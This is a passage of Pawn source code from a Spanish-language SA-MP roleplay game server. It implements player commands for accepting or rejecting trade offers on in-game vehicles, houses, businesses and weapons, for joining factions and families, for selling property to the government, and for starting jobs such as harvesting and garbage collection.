	   			DeletePVar(playerid, "OFERTA_PRECIO"  );
		        DeletePVar(playerid, "OFERTA_HOUSEID" );
				// -==============-
				return 1;
			}
		    if(GetPVarInt(playerid, "OFERTA_NEGID"))
		    {
		        new
		            ID = GetPVarInt(playerid, "OFERTA_POR");

				MensajeF(ID, -1, "El jugador "#CINFO"%s "#CBLANCO"decidio "#CROJO"rechazar "#CBLANCO"tu oferta.", NombreJugador(playerid) );
				MensajeF(playerid, -1, "Rechazaste la oferta de "#CINFO"%s.", NombreJugador(ID));
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"     );
	   			DeletePVar(playerid, "OFERTA_PRECIO"  );
		        DeletePVar(playerid, "OFERTA_NEGID"   );
				// -==============-
				return 1;
			}
		    if(GetPVarInt(playerid, "OFERTA_WEAPSLOT"))
		    {
		        new
		            ID = GetPVarInt(playerid, "OFERTA_POR");

				MensajeF(ID, -1, "El jugador "#CINFO"%s "#CBLANCO"decidio "#CROJO"rechazar "#CBLANCO"tu oferta.", NombreJugador(playerid) );
				MensajeF(playerid, -1, "Rechazaste la oferta de "#CINFO"%s.", NombreJugador(ID));
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"     );
	   			DeletePVar(playerid, "OFERTA_PRECIO"  );
		        DeletePVar(playerid, "OFERTA_WEAPSLOT");
				// -==============-
				return 1;
			}
			else
			{
			    return Error(playerid, "No te ofrecieron nada.");
			}
		}
	    else if(!strcmp(params, "faccion", true))
	    {
	        new
				Fac = GetPVarInt(playerid, "INVITACION_FACCION");

			if(!Fac)
			    return Error(playerid, "¡No tienes una invitación para ingresar a una facción!");

			if(ID_Faccion(playerid))
			{
			    DeletePVar(playerid, "INVITACION_FACCION");
			    return Error(playerid, "¡Ya tienes una facción!");
			}
			MensajeFaccionF(Fac, ""#CVERDE"%s "#CBLANCO"rechazó la invitación para la facción. "#CINFO"[%s]", NombreJugador_(playerid), NombreFaccion(Fac) );

			MensajeF(playerid, -1, "La invitación a "#CINFO"%s "#CBLANCO"fue rechazada.", NombreFaccion(Fac));
			DeletePVar(playerid, "INVITACION_FACCION");
			return 1;
		}
	    else if(!strcmp(params, "familia", true))
	    {
	        new
				Fam = GetPVarInt(playerid, "INVITACION_FAMILIA");

			if(!Fam)
			    return Error(playerid, "¡No tienes una invitación para ingresar a una familia!");

			if(ID_Familia(playerid))
			{
			    DeletePVar(playerid, "INVITACION_FAMILIA");
			    return Error(playerid, "¡Ya tienes una familia!");
			}
			MensajeFamiliaF(Fam, ""#CVERDE"%s "#CBLANCO"rechazó la invitación para la familia. "#CINFO"[%s]", NombreJugador_(playerid), InfoFamilia[Fam][fNombre] );

			MensajeF(playerid, -1, "La invitación a "#CINFO"%s "#CBLANCO"fue rechazada.", InfoFamilia[Fam][fNombre]);
			DeletePVar(playerid, "INVITACION_FAMILIA");
			return 1;
		}
		return ParamsINC(playerid, "/rechazar [oferta/faccion/familia]");
	}

	CMD:aceptar(playerid, params[])
	{
	    if(isnull(params)) return ParamsINC(playerid, "/aceptar [oferta/faccion/familia]");
	    if(!strcmp(params, "oferta", true))
	    {
		    if(GetPVarInt(playerid, "OFERTA_VEHID"))
		    {
		        new
		            ID =     GetPVarInt(playerid, "OFERTA_POR"   ),
		            Precio = GetPVarInt(playerid, "OFERTA_PRECIO"),
					VehID =  GetPVarInt(playerid, "OFERTA_VEHID" ),
					VehCount;

				if(!IsPlayerConnected(ID))
				{
					Error(playerid, "El jugador que te ofreció el vehículo se desconectó.");
					DeletePVar(playerid, "OFERTA_POR"   );
	    			DeletePVar(playerid, "OFERTA_PRECIO");
			        DeletePVar(playerid, "OFERTA_VEHID" );
					return 1;
				}
				foreach(VehVenta, i)
				{
				    if(EsDuenoVeh(playerid, i))
				    {
				        VehCount++;
				        if(VehCount >= MAX_VEH_PERSONA_2) return Error(playerid, "¡No puedes tener más vehículos! ~r~MÁXIMO "#MAX_VEH_PERSONA_2"");
					}
				}
				if(Precio > GetPlayerMoney(playerid))
				{
					Error(playerid, "¡No tenes suficiente dinero!");
					Mensaje(ID, -1, "El jugador al que le ofreciste el vehículo no tiene suficiente dinero.");
					DeletePVar(playerid, "OFERTA_POR"   );
	    			DeletePVar(playerid, "OFERTA_PRECIO");
			        DeletePVar(playerid, "OFERTA_VEHID" );
					return 1;
				}

				alm(InfoVeh[VehVenta_ID(VehID)][vComprador], pName(playerid) );
				GivePlayerMoney(ID, Precio);
				QuitarDinero(playerid, Precio);
				ActualizarVehiculo(VehVenta_ID(VehID));
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"   );
	   			DeletePVar(playerid, "OFERTA_PRECIO");
		        DeletePVar(playerid, "OFERTA_VEHID" );
				// -==============-
		        MensajeF(ID, -1, "La venta se concretó con "#CINFO"ÉXITO. "#CBLANCO"El vehículo fue vendido por "#CVERDE"$%d", Precio);
		        Mensaje(playerid, 1,  "=============================================================");
		        MensajeF(playerid,-1, "Felicitaciones, ¡Le compraste a %s un "#CINFO"%s "#CBLANCO" por "#CVERDE"$%d!", NombreJugador(ID), NombreVehiculo(VehID), Precio);
		        Mensaje(playerid, 1,  "=============================================================");
				UpdatePlayerVehicleTD(playerid, true);
				UpdatePlayerVehicleTD(ID, true);
		        return 1;
			}
		    if(GetPVarInt(playerid, "OFERTA_HOUSEID"))
		    {
		        new
		            ID =      GetPVarInt(playerid, "OFERTA_POR"     ),
		            Precio =  GetPVarInt(playerid, "OFERTA_PRECIO"  ),
					HouseID = GetPVarInt(playerid, "OFERTA_HOUSEID" ),
					HouseCount;

				if(!IsPlayerConnected(ID))
				{
					Error(playerid, "El jugador que te ofreció la casa se desconectó.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_HOUSEID" );
					return 1;
				}
				foreach(Casas, i)
				{
				    if(EsDuenoCasa(playerid, i))
				    {
				        HouseCount++;
				        if(HouseCount >= MAX_CASAS_JUGADOR) return Error(playerid, "¡No puedes tener más casas! ~r~MÁXIMO "#MAX_CASAS_JUGADOR"");
					}
				}
				if(Precio > GetPlayerMoney(playerid))
				{
					Error(playerid, "¡No tenes suficiente dinero!");
					Mensaje(ID, -1, "El jugador al que le ofreciste la casa no tiene suficiente dinero.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_HOUSEID" );
					return 1;
				}

				alm(InfoCasa[HouseID][cComprador], pName(playerid) );
				ActualizarCasaLabel(HouseID);
				ActualizarCasa(HouseID);
				GivePlayerMoney(ID, Precio);
				QuitarDinero(playerid, Precio);
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"   );
	   			DeletePVar(playerid, "OFERTA_PRECIO");
		        DeletePVar(playerid, "OFERTA_HOUSEID" );
				// -==============-
		        MensajeF(ID, -1, "La venta se concretó con "#CINFO"ÉXITO. "#CBLANCO"La casa fue vendida por "#CVERDE"$%d", Precio);
		        Mensaje(playerid, 1,  "=============================================================");
		        MensajeF(playerid,-1, "Felicitaciones, ¡Le compraste a %s una "#CINFO"CASA "#CBLANCO" por "#CVERDE"$%d!", NombreJugador(ID), Precio);
		        Mensaje(playerid, 1,  "=============================================================");
		        return 1;
			}
		    if(GetPVarInt(playerid, "OFERTA_NEGID"))
		    {
		        new
		            ID =      GetPVarInt(playerid, "OFERTA_POR"     ),
		            Precio =  GetPVarInt(playerid, "OFERTA_PRECIO"  ),
					NegID =   GetPVarInt(playerid, "OFERTA_NEGID"   ),
					NegCount;

				if(!IsPlayerConnected(ID))
				{
					Error(playerid, "El jugador que te ofreció el negocio se desconectó.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_NEGID"   );
					return 1;
				}
				foreach(Negocios, i)
				{
				    if(EsDuenoNegocio(playerid, i))
				    {
				        NegCount++;
				        if(NegCount >= MAX_NEGOCIOS_JUGADOR) return Error(playerid, "¡No puedes tener más negocios! ~r~MÁXIMO "#MAX_NEGOCIOS_JUGADOR"");
					}
				}
				if(Precio > GetPlayerMoney(playerid))
				{
					Error(playerid, "¡No tenes suficiente dinero!");
					Mensaje(ID, -1, "El jugador al que le ofreciste el negocio no tiene suficiente dinero.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_NEGID"   );
					return 1;
				}

				alm(InfoNegocio[NegID][nComprador], pName(playerid) );
				ActualizarNegLabel(NegID);
				ActualizarNegocio(NegID);
				GivePlayerMoney(ID, Precio);
				QuitarDinero(playerid, Precio);
				// -==============-
				DeletePVar(playerid, "OFERTA_POR"   );
	   			DeletePVar(playerid, "OFERTA_PRECIO");
		        DeletePVar(playerid, "OFERTA_NEGID" );
				// -==============-
		        MensajeF(ID, -1, "La venta se concretó con "#CINFO"ÉXITO. "#CBLANCO"El negocio fue vendido por "#CVERDE"$%d", Precio);
		        Mensaje(playerid, 1,  "=============================================================");
		        MensajeF(playerid,-1, "Felicitaciones, ¡Le compraste a %s un "#CINFO"NEGOCIO "#CBLANCO" por "#CVERDE"$%d!", NombreJugador(ID), Precio);
		        Mensaje(playerid, 1,  "=============================================================");
		        return 1;
			}
		    if(GetPVarInt(playerid, "OFERTA_WEAPSLOT"))
		    {
		        new
		            ID =        GetPVarInt(playerid, "OFERTA_POR"     ),
		            Precio =    GetPVarInt(playerid, "OFERTA_PRECIO"  ),
					Slot_weap = GetPVarInt(playerid, "OFERTA_WEAPSLOT");

				if(!IsPlayerConnected(ID))
				{
					Error(playerid, "El jugador que te ofreció el arma se desconectó.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_WEAPSLOT");
					return 1;
				}

				new
    				Player_weap, Player_ammo;

				GetPlayerWeaponData(playerid, Slot_weap, Player_weap, Player_ammo);

				if(Player_weap != 0) return Error(playerid, "¡Ya tienes un arma en el espacio de esta otra!");

				Player_weap = 0;
				Player_ammo = 0;

				GetPlayerWeaponData(ID, Slot_weap, Player_weap, Player_ammo);

				if(Player_weap == 0)
				{
					Error(playerid, "El jugador que te ofreció el arma ya no la tiene más.");
					Error(ID, "La venta ~r~fallo ~w~porque no tenes más el arma.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_WEAPSLOT");
					return 1;
				}
				if(Precio > GetPlayerMoney(playerid))
				{
					Error(playerid, "¡No tenes suficiente dinero!");
					Mensaje(ID, -1, "El jugador al que le ofreciste el arma no tiene suficiente dinero.");
					DeletePVar(playerid, "OFERTA_POR"     );
	    			DeletePVar(playerid, "OFERTA_PRECIO"  );
			        DeletePVar(playerid, "OFERTA_WEAPSLOT");
					return 1;
				}
				QuitarDinero(playerid, Precio);
				GivePlayerWeapon(playerid, Player_weap, Player_ammo);
				QuitarArma(ID, Slot_weap);
				GivePlayerMoney(ID, Precio);
				MensajeF(playerid, -1, "Le compraste a "#CINFO"%s "#CBLANCO"el arma por "#CVERDE"$%d.", NombreJugador(ID), Precio);
				MensajeF(ID, -1, "Le vendiste a "#CINFO"%s "#CBLANCO"el arma por "#CVERDE"$%d.", NombreJugador(playerid), Precio);
				return 1;
			}
			else
			{
			    return Error(playerid, "No te ofrecieron nada.");
			}
		}
	    else if(!strcmp(params, "faccion", true))
	    {
	        new
				Fac = GetPVarInt(playerid, "INVITACION_FACCION");
				
			if(!Fac)
			    return Error(playerid, "¡No tienes una invitación para ingresar a una facción!");
			    
			if(ID_Faccion(playerid))
			{
			    DeletePVar(playerid, "INVITACION_FACCION");
			    return Error(playerid, "¡Ya tienes una facción!");
			}
			MensajeFaccionF(Fac, ""#CVERDE"¡%s "#CBLANCO"se unio a la facción! "#CINFO"[%s]", NombreJugador_(playerid), NombreFaccion(Fac) );
			
			InfoJugador[playerid][jMiembro] = Fac;
			InfoJugador[playerid][jRango] = 1;
			MensajeF(playerid, -1, "¡Bienvenido a "#CINFO"%s! "#CBLANCO"Utiliza "#CINFO"/fac "#CBLANCO"para hablar con tus compañeros.", NombreFaccion(Fac));
			DeletePVar(playerid, "INVITACION_FACCION");
			return 1;
		}
	    else if(!strcmp(params, "familia", true))
	    {
	        new
				Fam = GetPVarInt(playerid, "INVITACION_FAMILIA");

			if(!Fam)
			    return Error(playerid, "¡No tienes una invitación para ingresar a una familia!");

			if(ID_Familia(playerid))
			{
			    DeletePVar(playerid, "INVITACION_FAMILIA");
			    return Error(playerid, "¡Ya tienes una familia!");
			}
			MensajeFamiliaF(Fam, ""#CVERDE"¡%s "#CBLANCO"se unio a la familia! "#CINFO"[%s]", NombreJugador_(playerid), InfoFamilia[Fam][fNombre] );

			InfoJugador[playerid][jMiembroFam] = Fam;
			InfoJugador[playerid][jRangoFam] = 1;
			MensajeF(playerid, -1, "¡Bienvenido a "#CINFO"%s! "#CBLANCO"Utiliza "#CINFO"/fam "#CBLANCO"para hablar con tus compañeros.", InfoFamilia[Fam][fNombre]);
			DeletePVar(playerid, "INVITACION_FAMILIA");
			return 1;
		}

		return ParamsINC(playerid, "/aceptar [oferta/faccion/familia]");
	}

	CMD:vender(playerid, params[])
	{
		if(!InfoJugador[playerid][jHoras]) return Error(playerid, "¡Debes jugar al menos una hora para vender!");

	    new
	        Item_0[20], PlayerID = -1, Precio = -255;

	    if(sscanf(params,"p< >s[20]U(-1)I(-255)",Item_0, PlayerID, Precio))
		{
			Mensaje(playerid, C_AZULRARO, "• "#CBLANCO"Si queres vender tu casa, negocio o vehículo al gobierno, utiliza "#CAZULRARO"/vender [negocio/casa/vehiculo]");
			Mensaje(playerid, C_AZULRARO, "• "#CBLANCO"Si queres venderle algo a otro jugador, utiliza "#CAZULRARO"/vender [negocio/casa/vehiculo/arma] [ID/Nombre] [precio]");
			return 1;
		}

		if(!strcmp(Item_0,"vehiculo",true))
		{
			Comando_En_Auto
			new VehID = GetPlayerVehicleID(playerid);
			if(VehVenta_ID(VehID) != 0)
			{
	  			if(strmatch(InfoVeh[VehVenta_ID(VehID)][vComprador], pName(playerid)))
		    	{
		    	    if(PlayerID != -1)
		    	    {
						if(Precio == -255) return ParamsINC(playerid, "/vender [vehiculo] [ID] "#CROJO"[precio]");
						if(PlayerID == playerid) return Error(playerid, "¿Porque te queres vender algo a vos mismo?");
		    	        if(!IsPlayerConnected(PlayerID)) return Error(playerid, "¡Jugador desconectado!");
		    	        if(Precio < 1) return Error(playerid, "El precio debe ser un número positivo.");
						if(GetPVarInt(PlayerID, "OFERTA_POR")) return Error(playerid, "Ese jugador ya recibio una oferta para otra cosa.");
						if(!ProxDetectorS(5.0, playerid, PlayerID)) return Error(playerid, "Estas demaciado lejos de ese jugador.");
						if(!InfoJugador[PlayerID][jHoras]) return Error(playerid, "¡Ese jugador jugó menos de una hora!");
						MensajeF(PlayerID, -1, "El jugador %s "#CBLANCO"te quiere vender su "#CINFO"%s "#CBLANCO"por "#CVERDE"$%d. "#CBLANCO"Utiliza "#CINFO"/aceptar oferta | /rechazar oferta", NombreJugador(playerid), NombreVehiculo(VehID), Precio);
						SetPVarInt(PlayerID, "OFERTA_POR", playerid);
		    	        SetPVarInt(PlayerID, "OFERTA_PRECIO", Precio);
		    	        SetPVarInt(PlayerID, "OFERTA_VEHID", VehID);
						MensajeF(playerid, -1, "Le ofreciste a "#CINFO"%s "#CBLANCO"tu "#CINFO"%s "#CBLANCO"por "#CVERDE"$%d. "#CBLANCO"Espera su respuesta..", NombreJugador(PlayerID), NombreVehiculo(VehID), Precio);
						return 1;
					}

		    	    if(!IsPlayerInRangeOfPoint(playerid,100,1654.2581,-1062.5406,23.8984)) return Error(playerid,"¡Debes vender tu vehículo en los 'autos usados'!");
					if(!InfoVeh[VehVenta_ID(VehID)][vUsado])
					{
						new Float:V_PRECIO = InfoVeh[VehVenta_ID(VehID)][vPrecio] / 4 * 3;
						new PrecioVeh_ = floatround(V_PRECIO);
						InfoVeh[VehVenta_ID(VehID)][vUsado] = true;
						InfoVeh[VehVenta_ID(VehID)][vPrecio] = PrecioVeh_;
						GivePlayerMoney(playerid, PrecioVeh_);
					}
					else
					{
						GivePlayerMoney(playerid, InfoVeh[VehVenta_ID(VehID)][vPrecio]);
					}
					alm(InfoVeh[VehVenta_ID(VehID)][vComprador], "Sin Dueño");
					GetVehiclePos(VehID, InfoVeh[VehVenta_ID(VehID)][vPosX],InfoVeh[VehVenta_ID(VehID)][vPosY],InfoVeh[VehVenta_ID(VehID)][vPosZ]);
					GetVehicleZAngle(VehID, InfoVeh[VehVenta_ID(VehID)][vPosA]);
					Mensaje(playerid, -1, "Vendiste tu vehículo al consecionario, y una parte del dinero (75 por ciento) te fue devuelto");
					SetVehicleToRespawn(VehID);
					SetVehiclePos(VehID, InfoVeh[VehVenta_ID(VehID)][vPosX],InfoVeh[VehVenta_ID(VehID)][vPosY],InfoVeh[VehVenta_ID(VehID)][vPosZ]);
					SetVehicleZAngle(VehID, InfoVeh[VehVenta_ID(VehID)][vPosA]);
					ActualizarVehiculo(VehVenta_ID(VehID));
					InfoVeh[VehVenta_ID(VehID)][vCerrado] = false;
					AbrirPuertas(VehID);
					UpdatePlayerVehicleTD(playerid, true);
			        return 1;
			    }
			    else return Error(playerid, "¡Este vehículo no te pertenece!"),1;
			}
			else return Error(playerid, "¡No puedes vender este vehículo!"),1;
		}
		else if(!strcmp(Item_0,"casa",true))
		{
		    new sucess;
			foreach(Casas,n)
			{
				if(strmatch(InfoCasa[n][cComprador], pName(playerid)))
				{
					if(IsPlayerInRangeOfPoint(playerid,2,InfoCasa[n][cEntrada_x],InfoCasa[n][cEntrada_y],InfoCasa[n][cEntrada_z]))
					{
			    	    if(PlayerID != -1)
			    	    {
							if(Precio == -255) return ParamsINC(playerid, "/vender [casa] [ID] "#CROJO"[precio]");
							if(PlayerID == playerid) return Error(playerid, "¿Porque te queres vender algo a vos mismo?");
			    	        if(!IsPlayerConnected(PlayerID)) return Error(playerid, "¡Jugador desconectado!");
			    	        if(Precio < 1) return Error(playerid, "El precio debe ser un número positivo.");
							if(GetPVarInt(PlayerID, "OFERTA_POR")) return Error(playerid, "Ese jugador ya recibio una oferta para otra cosa.");
							if(!ProxDetectorS(5.0, playerid, PlayerID)) return Error(playerid, "Estas demaciado lejos de ese jugador.");
							if(!InfoJugador[PlayerID][jHoras]) return Error(playerid, "¡Ese jugador jugó menos de una hora!");
							MensajeF(PlayerID, -1, "El jugador %s "#CBLANCO"te quiere vender su casa por "#CVERDE"$%d. "#CBLANCO"Utiliza "#CINFO"/aceptar oferta | /rechazar oferta", NombreJugador(playerid), Precio);
							SetPVarInt(PlayerID, "OFERTA_POR", playerid);
			    	        SetPVarInt(PlayerID, "OFERTA_PRECIO", Precio);
			    	        SetPVarInt(PlayerID, "OFERTA_HOUSEID", n);
							MensajeF(playerid, -1, "Le ofreciste a "#CINFO"%s "#CBLANCO"tu casa por "#CVERDE"$%d. "#CBLANCO"Espera su respuesta..", NombreJugador(PlayerID), Precio);
							return 1;
						}
					    InfoCasa[n][cComprada] = false;
						InfoCasa[n][cCerrada] = false;
						ActualizarCasaLabel(n);
						GivePlayerMoney(playerid, floatround(InfoCasa[n][cPrecio]*0.75) );
						Mensaje(playerid, -1, "Vendiste tu casa al gobierno, y una parte del dinero "#CROJO"(75%%)"#CBLANCO" te fue devuelto");
						alm(InfoCasa[n][cComprador],"Sin dueño");
						ActualizarCasa(n);
						sucess++;
						break;
					}
				}
			}
			if(!sucess) return Error(playerid,"¡No estás en tu casa!");
			return 1;
		}
		else if(!strcmp(Item_0,"negocio",true))
		{
		    new sucess;
			foreach(Negocios,n)
			{
				if(strmatch(InfoNegocio[n][nComprador], pName(playerid)))
				{
					if(IsPlayerInRangeOfPoint(playerid,2,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]))
					{
			    	    if(PlayerID != -1)
			    	    {
							if(Precio == -255) return ParamsINC(playerid, "/vender [negocio] [ID] "#CROJO"[precio]");
							if(PlayerID == playerid) return Error(playerid, "¿Porque te queres vender algo a vos mismo?");
			    	        if(!IsPlayerConnected(PlayerID)) return Error(playerid, "¡Jugador desconectado!");
			    	        if(Precio < 1) return Error(playerid, "El precio debe ser un número positivo.");
							if(GetPVarInt(PlayerID, "OFERTA_POR")) return Error(playerid, "Ese jugador ya recibio una oferta para otra cosa.");
							if(!ProxDetectorS(5.0, playerid, PlayerID)) return Error(playerid, "Estas demaciado lejos de ese jugador.");
							if(!InfoJugador[PlayerID][jHoras]) return Error(playerid, "¡Ese jugador jugó menos de una hora!");
							MensajeF(PlayerID, -1, "El jugador %s "#CBLANCO"te quiere vender su negocio por "#CVERDE"$%d. "#CBLANCO"Utiliza "#CINFO"/aceptar oferta | /rechazar oferta", NombreJugador(playerid), Precio);
							SetPVarInt(PlayerID, "OFERTA_POR", playerid);
			    	        SetPVarInt(PlayerID, "OFERTA_PRECIO", Precio);
			    	        SetPVarInt(PlayerID, "OFERTA_NEGID", n);
							MensajeF(playerid, -1, "Le ofreciste a "#CINFO"%s "#CBLANCO"tu negocio por "#CVERDE"$%d. "#CBLANCO"Espera su respuesta..", NombreJugador(PlayerID), Precio);
							return 1;
						}
					    InfoNegocio[n][nComprado] = false;
						InfoNegocio[n][nCerrado] = false;
						ActualizarNegLabel(n);
						GivePlayerMoney(playerid, floatround(InfoNegocio[n][nPrecio]*0.75) );
						Mensaje(playerid, -1, "Vendiste tu negocio al gobierno, y una parte del dinero "#CROJO"(75%%) "#CBLANCO"te fue devuelto");
						alm(InfoNegocio[n][nComprador],"Sin dueño");
						ActualizarNegocio(n);
						sucess++;
						break;
					}
				}
			}
			if(!sucess) return Error(playerid,"¡No estás en tu negocio!");
			return 1;
		}
		else if(!strcmp(Item_0,"arma",true))
		{
		    if(PlayerID == -1) return ParamsINC(playerid, "/vender [arma] "#CROJO"[ID] [precio]");
			if(Precio == -255) return ParamsINC(playerid, "/vender [arma] [ID] "#CROJO"[precio]");
			if(PlayerID == playerid) return Error(playerid, "¿Porque te queres vender algo a vos mismo?");
			if(!ProxDetectorS(5.0, playerid, PlayerID)) return Error(playerid, "Estas demaciado lejos de ese jugador.");
			if(!InfoJugador[PlayerID][jHoras]) return Error(playerid, "¡Ese jugador jugó menos de una hora!");

			if(    EsLSPD(playerid)
				|| EsMilitar(playerid)
				|| EsMedico(playerid)
				|| EsDelGobierno(playerid)) return Error(playerid, "Los miembros o líderes de facciones legales no pueden vender armas!");
				
			new
				Player_weap = GetPlayerWeapon(playerid);

			if(!Player_weap) return Error(playerid, "¡No tenes un arma en la mano!");

			new
				Name_weap[23],
				Ammo_weap = GetPlayerAmmo(playerid);

			GetWeaponName(Player_weap, Name_weap, 23);

			SetPVarInt(PlayerID, "OFERTA_POR", playerid);
   	        SetPVarInt(PlayerID, "OFERTA_PRECIO", Precio);
   	        SetPVarInt(PlayerID, "OFERTA_WEAPSLOT", GetWeaponSlot(Player_weap));

			MensajeF(PlayerID, -1, "El jugador %s "#CBLANCO"te quiere vender su "#CROJO"%s[%d balas] "#CBLANCO"por "#CVERDE"$%d. "#CBLANCO"Utiliza "#CINFO"/aceptar oferta | /rechazar oferta", NombreJugador(playerid), Name_weap, Ammo_weap, Precio);
			MensajeF(playerid, -1, "Le ofreciste a "#CINFO"%s "#CBLANCO"tu %s[%d balas] por "#CVERDE"$%d. "#CBLANCO"Espera su respuesta..", NombreJugador(PlayerID), Name_weap, Ammo_weap, Precio);
			return 1;
		}

		Mensaje(playerid, C_AZULRARO, "• "#CBLANCO"Si queres vender tu casa, negocio o vehículo al gobierno, utiliza "#CAZULRARO"/vender [negocio/casa/vehiculo]");
		Mensaje(playerid, C_AZULRARO, "• "#CBLANCO"Si queres venderle algo a otro jugador, utiliza "#CAZULRARO"/vender [negocio/casa/vehiculo/arma] [ID/Nombre] [precio]");
		return 1;
	}

	// -------=====[ Comandos trabajos [=======------ //


	//Cosechador
	CMD:cosechar(playerid,params[])
	{
	    if(InfoJugador[playerid][jTrabajo] != ID_Cosechador) return Error(playerid,"¡No eres cosechador!");
		if(!strcmp(params,"soja",false))
		{
		    if(EsCosechadora(GetPlayerVehicleID(playerid)))
		    {
		        if(GetPVarInt(playerid,"EstaCultivando")) return Error(playerid,"¡Ya estás cosechando!");
				SetPVarInt(playerid,"EstaCultivando",GetPlayerVehicleID(playerid));
				SetPVarInt(playerid,"ParteCosecha",0);
				SetPlayerRaceCheckpoint(playerid,0,PosCosechador[0][0],PosCosechador[0][1],PosCosechador[0][2],PosCosechador[1][0],PosCosechador[1][1],PosCosechador[1][2],7);
				Mensaje(playerid,-1,"¡Comienza a cosechar soja!");
				Mensaje(playerid,-1,"Es recomendable cerrar el vehículo "#CINFO"( CTRL )"#CBLANCO", para evitar que otro jugador te lo robe y cosechar el.");
				SetProgressBarMaxValue(BCosecha[playerid],sizeof PosCosechador-1);
				SetProgressBarValue(BCosecha[playerid],0);
				UpdateProgressBar(BCosecha[playerid],playerid);
				SetPVarInt(playerid,"COSECHANDO_ID", 0);
				return 1;
			}
			return Error(playerid,"¡Debes estar en una cosechadora para poder cosechar!");
		}
		else if(!strcmp(params,"trigo",false))
		{
		    if(EsCosechadora(GetPlayerVehicleID(playerid)))
		    {
		        #define PosCosechador PosCosechadorLVL2
		        if(InfoJugador[playerid][jNivelTrabajo] < 2) return Error(playerid,"¡Debes ser nivel dos de cosechador para cosechar trigo!");
		        if(GetPVarInt(playerid,"EstaCultivando")) return Error(playerid,"¡Ya estás cosechando!");
				SetPVarInt(playerid,"EstaCultivando",GetPlayerVehicleID(playerid));
				SetPVarInt(playerid,"ParteCosecha",0);
				SetPlayerRaceCheckpoint(playerid,0,PosCosechador[0][0],PosCosechador[0][1],PosCosechador[0][2],PosCosechador[1][0],PosCosechador[1][1],PosCosechador[1][2],7);
				Mensaje(playerid,-1,"¡Comienza a cosechar trigo!");
				Mensaje(playerid,-1,"Es recomendable cerrar el vehículo "#CINFO"( CTRL )"#CBLANCO", para evitar que otro jugador te lo robe y cosechar el.");
				SetProgressBarMaxValue(BCosecha[playerid],sizeof PosCosechador-1);
				SetProgressBarValue(BCosecha[playerid],0);
				UpdateProgressBar(BCosecha[playerid],playerid);
				SetPVarInt(playerid,"COSECHANDO_ID", 1);
				#undef PosCosechador
				return 1;
			}
			return Error(playerid,"¡Debes estar en una cosechadora para poder cosechar!");
		}
		else if(!strcmp(params,"marihuana",false))
		{
		    if(EsCosechadora(GetPlayerVehicleID(playerid)))
		    {
		        #define PosCosechador PosCosechadorMari
		        if(InfoJugador[playerid][jNivelTrabajo] < 2) return Error(playerid,"¡Debes ser nivel dos de cosechador para cosechar mnarihuana!");
		        if(GetPVarInt(playerid,"EstaCultivando")) return Error(playerid,"¡Ya estás cosechando!");
				SetPVarInt(playerid,"EstaCultivando",GetPlayerVehicleID(playerid));
				SetPVarInt(playerid,"ParteCosecha",0);
				SetPlayerRaceCheckpoint(playerid,0,PosCosechador[0][0],PosCosechador[0][1],PosCosechador[0][2],PosCosechador[1][0],PosCosechador[1][1],PosCosechador[1][2],7);
				Mensaje(playerid,-1,"¡Comienza a cosechar marihuana!");
				Mensaje(playerid,-1,"Es recomendable cerrar el vehículo "#CINFO"( CTRL )"#CBLANCO", para evitar que otro jugador te lo robe y cosechar el.");
				SetProgressBarMaxValue(BCosecha[playerid],sizeof PosCosechador-1);
				SetProgressBarValue(BCosecha[playerid],0);
				UpdateProgressBar(BCosecha[playerid],playerid);
				SetPVarInt(playerid,"COSECHANDO_ID", 2);
				#undef PosCosechador
				return 1;
			}
			return Error(playerid,"¡Debes estar en una cosechadora para poder cosechar!");
		}
		return ParamsINC(playerid,"/cosechar <soja/trigo>");
	}

	CMD:comenzar(playerid,params[])
	{
	    if(sscanf(params,"s[20]",params[0])) return ParamsINC(playerid,"/comenzar <ITEM>");
	    if(!strcmp(params,"limpieza",true))
	    {
	    	if(!EsBasurero(playerid)) return Error(playerid,"¡No eres basurero!");
			if(!EsVehBasurero(GetPlayerVehicleID(playerid))) return Error(playerid,"¡No estás en un camión basurero!");
			foreach(Player,i)
			{
				if(GetPVarInt(i,"CAMION_BASURA") == GetPlayerVehicleID(playerid))
				{
					Error(playerid,"¡Ya alguien está utilizando este camión!");
					return 1;
				}
			}
	        SetPlayerCP(playerid,CP_BASURERO,PosBasura[0][0],PosBasura[0][1],PosBasura[0][2],3);
	        Mensaje(playerid,-1,"Dirijete al "#CROJO"punto rojo en el mapa "#CBLANCO"y limpialo, utilizando "#CINFO"/limpiar");
			SetPVarInt(playerid,"CAMION_BASURA",GetPlayerVehicleID(playerid));
			Loop(i,sizeof(PosBasura)-1,0)
			{
			    if(IsValidDynamicObject(OBJ_Basura[i])) continue;
       			OBJ_Basura[i] = CreateDynamicObject(1574,PosBasura[i][0],PosBasura[i][1],PosBasura[i][2]-1.7,0,0,0);
			}
			SetProgressBarMaxValue(BCosecha[playerid],sizeof(PosBasura)-1);
			ShowProgressBarForPlayer(playerid,BCosecha[playerid]);
	        return 1;
		}
		return ParamsINC(playerid,"/comenzar <ITEM>");
	}

	CMD:repartir(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid, "/repartir [pizza/diarios]");
	    if(!strcmp(params, "diarios", true))
	    {
		    if(InfoJugador[playerid][jTrabajo] != ID_RepartidorB) return Error(playerid,"¡Debes ser repartidor de diarios!");
			new VehID = GetPlayerVehicleID(playerid);
			if(EsBiciRepartidora(VehID))
			{
